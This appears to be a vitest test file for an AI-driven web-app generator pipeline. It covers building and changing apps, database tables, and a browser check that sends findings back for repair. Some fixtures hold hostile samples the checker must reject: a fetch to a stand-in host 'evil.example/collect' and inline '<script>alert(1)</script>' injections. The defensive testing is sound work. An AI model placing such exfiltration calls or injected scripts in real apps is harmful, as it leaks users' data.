import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { loadConfig, type Config } from '../src/config.js'
import { DatabaseDown, type Change, type Gateway } from '../src/gate.js'
import { createPipeline, loadLibs, publicError, type Reporter } from '../src/pipeline.js'
import { AppGone, type PublishHooks } from '../src/publish.js'
import { NOT_SEEN, type AppToOpen, type Seen } from '../src/render.js'
import { AgentError, type AgentRun } from '../src/sandbox.js'
import { Store } from '../src/store.js'

const HOUR = 3_600_000
const page = (body: string) => `<!doctype html><html><head><title>t</title></head><body>${body}<script src="app.js"></script></body></html>`

let dir: string
let cfg: Config
let store: Store
let runs: AgentRun[]
let published: { appId: string; jobId: string; html: string; files: Map<string, Buffer> }[]

// Stands in for the container: writes into the job's workspace what a test tells it to.
let agent: (workspace: string, run: AgentRun) => void
const run = async (_cfg: Config, job: AgentRun) => {
  runs.push(job)
  agent(join(cfg.DATA_DIR, 'jobs', job.jobId), job)
}
// Stands in for the repository: takes the files and reports the push.
const publish = async (appId: string, jobId: string, files: Map<string, Buffer>, hooks: PublishHooks) => {
  if (!hooks.isLive()) throw new AppGone()
  published.push({ appId, jobId, html: files.get('index.html')!.toString(), files })
  await hooks.pushed()
  return `https://apps.example/apps/${appId}/`
}
let notes: string[]
const report: Reporter = { status: () => {}, file: () => {}, note: (text) => void notes.push(text), cost: () => {} }
const build = (jobId: string) => createPipeline(cfg, store, run, publish)(store.getJob(jobId)!, report)
const stored = (appId: string, file: string) => join(cfg.DATA_DIR, 'sources', appId, file)

beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), 'ag-pipeline-'))
  cfg = loadConfig({
    DATA_DIR: dir,
    LIBS_DIR: join(import.meta.dirname, '../../sandbox/libs'),
    WEB_ORIGIN: 'https://app-generator.example',
    TURNSTILE_SECRET: 'turnstile-secret',
    IP_HASH_SECRET: 'i'.repeat(32),
    PROXY_SIGNING_SECRET: 'p'.repeat(32),
    // Nothing listens here: the launcher and the cost lookup fail quietly, as they may.
    PROXY_URL: 'http://127.0.0.1:9',
    SANDBOX_LAUNCHER: '/bin/false',
    // The tests of the browser check hand the pipeline a browser of their own.
    BROWSER_CHECK: 'off',
  })
  store = new Store(':memory:')
  runs = []
  published = []
  notes = []
  vi.spyOn(console, 'error').mockImplementation(() => {})
})
afterEach(() => {
  vi.restoreAllMocks()
  rmSync(dir, { recursive: true, force: true })
})

describe('the bundled libraries', () => {
  it('are read by their path under lib/, folders included, without what only documents them', async () => {
    const libs = join(dir, 'libs')
    mkdirSync(join(libs, 'fonts/inter'), { recursive: true })
    writeFileSync(join(libs, 'chart.js'), 'chart')
    writeFileSync(join(libs, 'fonts/inter/font.css'), 'css')
    writeFileSync(join(libs, 'fonts/inter/inter-latin.woff2'), Buffer.from([0, 255, 1]))
    writeFileSync(join(libs, 'fonts/inter/LICENSE.txt'), 'licence')
    writeFileSync(join(libs, 'README.md'), 'how to add a library')
    writeFileSync(join(libs, 'build-icons.mjs'), 'a build script')
    writeFileSync(join(libs, '.DS_Store'), 'junk')
    const read = await loadLibs(libs)
    expect([...read.keys()].sort()).toEqual(['chart.js', 'fonts/inter/LICENSE.txt', 'fonts/inter/font.css', 'fonts/inter/inter-latin.woff2'])
    expect([...read.get('fonts/inter/inter-latin.woff2')!]).toEqual([0, 255, 1])
  })

  it('are the ones in this repository', async () => {
    const read = await loadLibs(cfg.LIBS_DIR)
    expect([...read.keys()]).toEqual(expect.arrayContaining(['chart.js', 'data.js', 'db.js', 'preact.js', 'qrcode.js']))
    expect(read.has('README.md')).toBe(false)
  })
})

describe('building and changing an app', () => {
  it('keeps the files of an owned app and starts a change from them', async () => {
    store.createJob({ id: 'app1', prompt: 'a counter', ipHash: 'h', userId: 'user-anna', expiresAt: Date.now() + 240 * HOUR })
    agent = (workspace) => {
      writeFileSync(join(workspace, 'index.html'), page('<h1>Counter</h1>'))
      writeFileSync(join(workspace, 'app.js'), 'let count = 0')
    }
    expect(await build('app1')).toBe('https://apps.example/apps/app1/')
    expect(runs[0]).toMatchObject({ jobId: 'app1', request: 'a counter', edit: false, gateToken: '-' })
    expect(store.getApp('app1')!.currentJobId).toBe('app1')
    // Stored as the agent wrote it; published with the checker's additions.
    expect(readFileSync(stored('app1', 'index.html'), 'utf8')).toBe(page('<h1>Counter</h1>'))
    expect(published[0]!.html).toContain('content="app1"')
    expect(existsSync(stored('app1', 'lib'))).toBe(false)

    store.createJob({ id: 'job2', appId: 'app1', prompt: 'call it Tally', ipHash: 'h', userId: 'user-anna' })
    agent = (workspace) => {
      // The change finds the last build in its workspace, next to the libraries.
      expect(readFileSync(join(workspace, 'index.html'), 'utf8')).toBe(page('<h1>Counter</h1>'))
      expect(readFileSync(join(workspace, 'app.js'), 'utf8')).toBe('let count = 0')
      expect(existsSync(join(workspace, 'lib', 'qrcode.js'))).toBe(true)
      writeFileSync(join(workspace, 'index.html'), page('<h1>Tally</h1>'))
    }
    expect(await build('job2')).toBe('https://apps.example/apps/app1/')
    expect(runs[1]).toMatchObject({ jobId: 'job2', request: 'call it Tally', edit: true })
    expect(published[1]).toMatchObject({ appId: 'app1', jobId: 'job2' })
    expect(published[1]!.html).toContain('<h1>Tally</h1>')
    expect(published[1]!.html).toContain('src="app.js?v=job2"')
    expect(store.getApp('app1')!.currentJobId).toBe('job2')
    expect(readFileSync(stored('app1', 'index.html'), 'utf8')).toBe(page('<h1>Tally</h1>'))
    expect(readFileSync(stored('app1', 'app.js'), 'utf8')).toBe('let count = 0')
    expect(existsSync(join(cfg.DATA_DIR, 'jobs', 'job2'))).toBe(false)
  })

  it('points a page with live data at this server, if it has an address for that', async () => {
    store.createJob({ id: 'app1', prompt: 'the weather', ipHash: 'h', expiresAt: Date.now() + 24 * HOUR })
    agent = (workspace) => {
      writeFileSync(join(workspace, 'index.html'), page('<p id="now"></p><script src="lib/data.js"></script>'))
      writeFileSync(join(workspace, 'app.js'), 'data.weather(48.4, 9.99).then((weather) => { document.getElementById("now").textContent = weather.current.temperature })')
    }
    await expect(build('app1')).rejects.toThrow(/live data is not available here/)

    cfg = { ...cfg, API_ORIGIN: 'https://api.app-generator.example' }
    store.createJob({ id: 'app2', prompt: 'the weather', ipHash: 'h', expiresAt: Date.now() + 24 * HOUR })
    notes = []
    await build('app2')
    expect(notes).toEqual(['Live data allowed: weather and exchange rates'])
    expect(published[0]!.html).toContain('connect-src https://api.app-generator.example/api/data/;')
    expect(published[0]!.html).toContain('<meta name="app-generator-data" content="https://api.app-generator.example/api/data/">')
  })

  it('keeps nothing of an app without an owner', async () => {
    store.createJob({ id: 'anon1', prompt: 'a counter', ipHash: 'h', expiresAt: Date.now() + 24 * HOUR })
    agent = (workspace) => {
      writeFileSync(join(workspace, 'index.html'), page('<h1>Counter</h1>'))
      writeFileSync(join(workspace, 'app.js'), '1')
    }
    await build('anon1')
    expect(published).toHaveLength(1)
    expect(store.getApp('anon1')!.currentJobId).toBeNull()
    expect(existsSync(join(cfg.DATA_DIR, 'sources'))).toBe(false)
  })

  it('does not start a change without the files to start from, nor publish one for an app that has ended', async () => {
    store.createJob({ id: 'app1', prompt: 'a counter', ipHash: 'h', userId: 'user-anna', expiresAt: Date.now() + 240 * HOUR })
    store.createJob({ id: 'job2', appId: 'app1', prompt: 'call it Tally', ipHash: 'h', userId: 'user-anna' })
    agent = () => expect.unreachable('the agent must not run')
    await expect(build('job2')).rejects.toThrow(AppGone)
    expect(runs).toHaveLength(0)

    agent = (workspace) => {
      writeFileSync(join(workspace, 'index.html'), page('<h1>Counter</h1>'))
      writeFileSync(join(workspace, 'app.js'), '1')
    }
    await build('app1')
    // The app ends while its change is being built.
    agent = (workspace) => {
      writeFileSync(join(workspace, 'index.html'), page('<h1>Tally</h1>'))
      store.setStatus('app1', 'failed')
    }
    await expect(build('job2')).rejects.toThrow(AppGone)
    expect(published).toHaveLength(1)
    expect(readFileSync(stored('app1', 'index.html'), 'utf8')).toBe(page('<h1>Counter</h1>'))
  })

  it('does not publish a change the checker rejects, and leaves the stored files alone', async () => {
    store.createJob({ id: 'app1', prompt: 'a counter', ipHash: 'h', userId: 'user-anna', expiresAt: Date.now() + 240 * HOUR })
    agent = (workspace) => {
      writeFileSync(join(workspace, 'index.html'), page('<h1>Counter</h1>'))
      writeFileSync(join(workspace, 'app.js'), '1')
    }
    await build('app1')
    store.createJob({ id: 'job2', appId: 'app1', prompt: 'add tracking', ipHash: 'h', userId: 'user-anna' })
    agent = (workspace) => writeFileSync(join(workspace, 'app.js'), 'fetch("https://evil.example/collect")')
    await expect(build('job2')).rejects.toThrow(/external URLs are not allowed/)
    // Asked once, then once more with the checker's findings.
    expect(runs.slice(1).map((r) => r.problems?.length ?? 0)).toEqual([0, 1])
    expect(published).toHaveLength(1)
    expect(store.getApp('app1')!.currentJobId).toBe('app1')
    expect(readFileSync(stored('app1', 'app.js'), 'utf8')).toBe('1')
  })
})

describe('apps with tables', () => {
  const dbPage = '<!doctype html><html><head><title>t</title></head><body><ul id="list"></ul><script src="lib/db.js"></script><script src="app.js"></script></body></html>'
  const table: Change = { action: 'create_table', table: 'entries', mode: 'append', columns: [{ name: 'author', type: 'text' }] }
  const guestbook = (workspace: string) => {
    writeFileSync(join(workspace, 'index.html'), dbPage)
    writeFileSync(join(workspace, 'app.js'), 'db.table("entries").subscribe((rows) => { document.getElementById("list").textContent = String(rows.length) })')
  }

  // Stands in for the gateway. `asked` is what the agent's tools wrote down for the job.
  let asked: Change[]
  let existing: { name: string }[]
  let log: string[]
  let gate: Gateway
  const buildWith = (jobId: string) => createPipeline(cfg, store, run, async (...args) => (log.push('publish'), publish(...args)), gate)(store.getJob(jobId)!, report)

  beforeEach(() => {
    asked = []
    existing = []
    log = []
    gate = {
      enabled: true,
      token: (appId, jobId) => `agd1.${appId}.${jobId}.pass`,
      database: (appId) => ({ url: 'https://project.example', key: 'public-key', prefix: `a${appId}_` }),
      tables: async (appId) => (log.push(`tables ${appId}`), existing),
      plan: async (jobId) => (log.push(`plan ${jobId}`), asked),
      commit: async (appId, changes) => void log.push(`commit ${appId} ${changes.map((change) => change.action).join(',')}`),
      sweep: async () => [],
    }
    store.createJob({ id: 'app1', prompt: 'a guestbook', ipHash: 'h', userId: 'user-anna', expiresAt: Date.now() + 240 * HOUR })
  })

  it('creates the tables an agent asked for once the app has passed the checker, and before it is published', async () => {
    agent = (workspace, job) => {
      expect(job.gateToken).toBe('agd1.app1.app1.pass')
      asked = [table]
      // Asking twice is told once.
      job.onDatabaseWish()
      job.onDatabaseWish()
      guestbook(workspace)
    }
    await buildWith('app1')
    expect(log).toEqual(['plan app1', 'commit app1 create_table', 'publish'])
    expect(notes).toEqual(['Database requested through an MCP tool', 'Database set up after the check passed'])
    expect(store.getApp('app1')!.hasDb).toBe(1)
    const html = published[0]!.html
    expect(html).toContain('connect-src https://project.example/rest/v1/')
    expect(html).toContain('&quot;prefix&quot;:&quot;aapp1_&quot;')
    expect(html).toContain('Anything entered here is public.')
  })

  it('creates nothing when the checker rejects the app', async () => {
    agent = (workspace) => {
      asked = [table]
      guestbook(workspace)
      writeFileSync(join(workspace, 'app.js'), 'db.table("entries").list().then((rows) => { document.body.innerHTML = rows[0].author })')
    }
    await expect(buildWith('app1')).rejects.toThrow(/not allowed in an app with a database/)
    expect(log).toEqual(['plan app1', 'plan app1'])
    expect(store.getApp('app1')!.hasDb).toBe(0)
    expect(published).toHaveLength(0)
  })

  it('sends an app back that uses the database without having asked for a table', async () => {
    let round = 0
    agent = (workspace, job) => {
      if (round++ === 0) return guestbook(workspace)
      expect(job.problems).toEqual([expect.stringContaining('loads lib/db.js, but the app has no table')])
      writeFileSync(join(workspace, 'index.html'), dbPage.replace('<script src="lib/db.js"></script>', ''))
      writeFileSync(join(workspace, 'app.js'), 'localStorage.setItem("entries", "[]")')
    }
    await buildWith('app1')
    expect(log).toEqual(['plan app1', 'plan app1', 'publish'])
    expect(published[0]!.html).toContain("connect-src 'none'")
    expect(published[0]!.html).not.toContain('app-generator-db')
    expect(store.getApp('app1')!.hasDb).toBe(0)
  })

  it('rejects an app that carries its database pass', async () => {
    agent = (workspace) => {
      asked = [table]
      guestbook(workspace)
      writeFileSync(join(workspace, 'notes.txt'), 'my pass is agd1.app1.app1.pass')
    }
    await expect(buildWith('app1')).rejects.toThrow(/contains a server secret/)
    expect(log).not.toContain('commit app1 create_table')
  })

  it('builds an app without tables as before when the gateway cannot be asked', async () => {
    gate.plan = async () => {
      throw new DatabaseDown('the database gateway is out of reach')
    }
    agent = (workspace) => {
      writeFileSync(join(workspace, 'index.html'), page('<h1>Counter</h1>'))
      writeFileSync(join(workspace, 'app.js'), '1')
    }
    await buildWith('app1')
    expect(published).toHaveLength(1)
    expect(log).toEqual(['publish'])
  })

  it('publishes nothing when the tables cannot be created', async () => {
    gate.commit = async () => {
      throw new DatabaseDown('the database gateway answered 400 to /admin/commit')
    }
    agent = (workspace) => {
      asked = [table]
      guestbook(workspace)
    }
    const failure = await buildWith('app1').catch((error: unknown) => error)
    expect(failure).toBeInstanceOf(DatabaseDown)
    expect(publicError(failure)).toBe('The database for apps is not available at the moment. Please try again in a few minutes.')
    expect(published).toHaveLength(0)
    expect(store.getApp('app1')!.hasDb).toBe(0)
  })

  it('changes an app with tables knowing them, and stops before spending anything when it cannot', async () => {
    agent = (workspace) => {
      asked = [table]
      guestbook(workspace)
    }
    await buildWith('app1')

    // A change that asks for nothing new: the page still learns where its tables are.
    store.createJob({ id: 'job2', appId: 'app1', prompt: 'make it blue', ipHash: 'h', userId: 'user-anna' })
    asked = []
    existing = [{ name: 'entries' }]
    log = []
    agent = (workspace) => writeFileSync(join(workspace, 'app.js'), 'db.table("entries").list()')
    await buildWith('job2')
    expect(log).toEqual(['tables app1', 'plan job2', 'publish'])
    expect(published[1]!.html).toContain('&quot;prefix&quot;:&quot;aapp1_&quot;')

    store.createJob({ id: 'job3', appId: 'app1', prompt: 'make it red', ipHash: 'h', userId: 'user-anna' })
    gate.tables = async () => {
      throw new DatabaseDown('the database gateway is out of reach')
    }
    agent = () => expect.unreachable('the agent must not run')
    await expect(buildWith('job3')).rejects.toThrow(DatabaseDown)
    expect(runs).toHaveLength(2)
    expect(published).toHaveLength(2)
  })
})

describe('the browser check', () => {
  const picture = Buffer.from('a picture of the page')
  const clean: Seen = { ran: true, problems: [], pictures: new Map([['phone', picture], ['desktop', Buffer.from('a wide picture')]]) }
  const found = (...problems: string[]): Seen => ({ ...clean, problems })
  const table: Change = { action: 'create_table', table: 'entries', mode: 'append', columns: [{ name: 'author', type: 'text' }] }

  // Stands in for the browser container: says what a test tells it to, look after look.
  let opened: AppToOpen[]
  let sees: Seen[]
  let asked: Change[]
  let commits: Change[][]
  const open = async (_cfg: Config, app: AppToOpen) => {
    opened.push(app)
    return sees.shift() ?? clean
  }
  const gate = (): Gateway => ({
    enabled: true,
    token: () => 'agd1.pass',
    database: (appId) => ({ url: 'https://project.example', key: 'public-key', prefix: `a${appId}_` }),
    tables: async () => [{ name: 'guests' }],
    plan: async () => asked,
    commit: async (_appId, changes) => void commits.push(changes),
    sweep: async () => [],
  })
  const buildSeen = (jobId: string, withGate?: Gateway) => createPipeline({ ...cfg, BROWSER_CHECK: 'on' }, store, run, publish, withGate, open)(store.getJob(jobId)!, report)
  const counter = (heading: string) => (workspace: string) => {
    writeFileSync(join(workspace, 'index.html'), page(`<h1>${heading}</h1>`))
    writeFileSync(join(workspace, 'app.js'), 'let count = 0')
  }

  beforeEach(() => {
    opened = []
    sees = []
    asked = []
    commits = []
    store.createJob({ id: 'app1', prompt: 'a counter', ipHash: 'h', userId: 'user-anna', expiresAt: Date.now() + 240 * HOUR })
  })

  it('opens the app as it would be published, and publishes a picture of it', async () => {
    agent = counter('Counter')
    await buildSeen('app1')
    expect(opened).toHaveLength(1)
    expect(opened[0]).toMatchObject({ jobId: 'app1', base: 'https://lukasb3.github.io/app-generator-apps/apps/app1/', database: undefined, liveData: undefined })
    // The checker's output, policy included, and the agent's files as it wrote them.
    expect(opened[0]!.files.get('index.html')!.toString()).toContain('Content-Security-Policy')
    expect(opened[0]!.sources.get('index.html')).toBe(page('<h1>Counter</h1>'))
    expect(published[0]!.files.get('preview.png')).toBe(picture)
    expect(notes).toEqual([])
    expect(runs).toHaveLength(1)
  })

  it('is not asked at all when it is switched off', async () => {
    agent = counter('Counter')
    await build('app1')
    expect(opened).toEqual([])
    expect(published[0]!.files.has('preview.png')).toBe(false)
    expect(notes).toEqual([])
  })

  it('sends its findings to the agent once, and publishes the repaired app', async () => {
    sees = [found('The page shows "Total: undefined" when it loads.')]
    agent = (workspace, job) => counter(job.problems ? 'Repaired' : 'Broken')(workspace)
    await buildSeen('app1')
    expect(runs).toHaveLength(2)
    expect(runs[1]!.problems).toEqual(['The page shows "Total: undefined" when it loads.'])
    expect(opened).toHaveLength(2)
    expect(published[0]!.html).toContain('Repaired')
    expect(notes).toEqual(['The browser check found problems, asking the agent to fix them'])
    expect(readFileSync(stored('app1', 'index.html'), 'utf8')).toContain('Repaired')
  })

  it('publishes the repaired app when findings remain but are fewer, and says so', async () => {
    sees = [found('one', 'two'), found('two')]
    agent = (workspace, job) => counter(job.problems ? 'Repaired' : 'Broken')(workspace)
    await buildSeen('app1')
    expect(runs).toHaveLength(2)
    expect(published[0]!.html).toContain('Repaired')
    expect(notes).toEqual(['The browser check found problems, asking the agent to fix them', 'The browser check still has findings; the app is published as it is'])
  })

  it.each([
    ['leaves as many findings', (workspace: string) => counter('Repaired')(workspace), [found('one'), found('other')]],
    ['breaks a rule', (workspace: string) => counter('Repaired</h1><script>alert(1)</script><h1>')(workspace), [found('one')]],
    [
      'ends with the agent giving up',
      () => {
        throw new AgentError('the agent declined')
      },
      [found('one')],
    ],
  ])('keeps the first version when the repair %s', async (_name, repair, looks) => {
    sees = looks
    agent = (workspace, job) => (job.problems ? repair(workspace) : counter('First')(workspace))
    expect(await buildSeen('app1')).toBe('https://apps.example/apps/app1/')
    expect(runs).toHaveLength(2)
    expect(published[0]!.html).toContain('First')
    expect(published[0]!.files.get('preview.png')).toBe(picture)
    expect(readFileSync(stored('app1', 'index.html'), 'utf8')).toContain('First')
    expect(notes).toEqual(['The browser check found problems, asking the agent to fix them', 'The browser check still has findings; the app is published as it is'])
  })

  it('creates the tables the published version asked for, not those of a repair that was set aside', async () => {
    sees = [found('one')]
    agent = (workspace, job) => {
      // The repair asks for a second table and then breaks a rule.
      asked = job.problems ? [table, { ...table, table: 'more' }] : [table]
      writeFileSync(join(workspace, 'index.html'), page(job.problems ? '<script>alert(1)</script>' : '<h1>First</h1>'))
      writeFileSync(join(workspace, 'app.js'), 'let count = 0')
    }
    await buildSeen('app1', gate())
    expect(commits).toEqual([[table]])
    expect(published[0]!.html).toContain('First')
  })

  it('gives the checker and itself one repair round between them', async () => {
    // The first version breaks a rule, so the browser never sees it. The repaired one has findings: no second round.
    sees = [found('one')]
    agent = (workspace, job) => counter(job.problems ? 'Repaired' : 'Broken</h1><script>alert(1)</script><h1>')(workspace)
    await buildSeen('app1')
    expect(runs).toHaveLength(2)
    expect(runs[1]!.problems![0]).toContain('inline <script> is not allowed')
    expect(opened).toHaveLength(1)
    expect(published[0]!.html).toContain('Repaired')
    expect(notes).toEqual(['The checker found problems, asking the agent to fix them', 'The browser check still has findings; the app is published as it is'])
  })

  it('still fails a build that breaks the rules twice, whatever a browser would say', async () => {
    agent = counter('Broken</h1><script>alert(1)</script><h1>')
    await expect(buildSeen('app1')).rejects.toThrow('inline <script> is not allowed')
    expect(opened).toEqual([])
    expect(published).toEqual([])
  })

  it('lets the build go on when it cannot run, and says so', async () => {
    sees = [NOT_SEEN]
    agent = counter('Counter')
    expect(await buildSeen('app1')).toBe('https://apps.example/apps/app1/')
    expect(runs).toHaveLength(1)
    expect(published[0]!.files.has('preview.png')).toBe(false)
    expect(notes).toEqual(['The browser check could not run'])
  })

  it('publishes no picture that is too large', async () => {
    sees = [{ ...clean, pictures: new Map([['phone', Buffer.alloc(300_001)]]) }]
    agent = counter('Counter')
    await buildSeen('app1')
    expect(published[0]!.files.has('preview.png')).toBe(false)
  })

  it('tells the browser where the app finds its tables and live data, and which tables there are', async () => {
    cfg = { ...cfg, API_ORIGIN: 'https://api.example' }
    asked = [table]
    agent = (workspace) => {
      writeFileSync(join(workspace, 'index.html'), '<!doctype html><html><head><title>t</title></head><body><script src="lib/db.js"></script><script src="lib/data.js"></script><script src="app.js"></script></body></html>')
      writeFileSync(join(workspace, 'app.js'), 'db.table("entries").list()')
    }
    store.setHasDb('app1')
    await buildSeen('app1', gate())
    expect(opened[0]).toMatchObject({ database: { url: 'https://project.example', prefix: 'aapp1_', tables: ['guests', 'entries'] }, liveData: 'https://api.example/api/data/' })
    // The key is public, and still not the browser's business.
    expect(opened[0]!.database).not.toHaveProperty('key')
  })
})
